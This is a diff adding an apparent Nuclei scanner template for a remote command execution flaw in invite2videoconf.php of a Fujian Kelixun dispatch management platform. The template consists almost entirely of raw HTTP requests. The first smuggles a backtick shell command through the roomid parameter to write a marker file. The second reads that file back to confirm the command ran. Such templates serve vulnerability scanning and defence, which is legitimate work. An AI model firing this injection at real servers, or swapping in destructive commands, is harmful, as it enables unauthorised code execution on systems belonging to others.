@@ -1,0 +1,31 @@
+id: command-dispatch-invite2videoconf-rce
+info:
+  name: dispatch invite2videoconf - Remote Code Execution
+  author: qwtd
+  severity: high
+  description: |
+    福建科立讯通信有限公司指挥调度管理平台 invite2videoconf.php 任意命令执行漏洞
+  reference:
+    - https://wiki.wy876.cn/#/./%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0RCE
+  tags: 指挥调度管理平台
+
+http:
+  - raw:
+      - |
+        GET /api/client/invite2videoconf.php?callee=1&roomid=`echo randstr123456>1.txt` HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+      - |
+        GET  /api/client/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - 'status_code_2 == 200 && contains(body_2,"randstr123456")'
+        condition: and
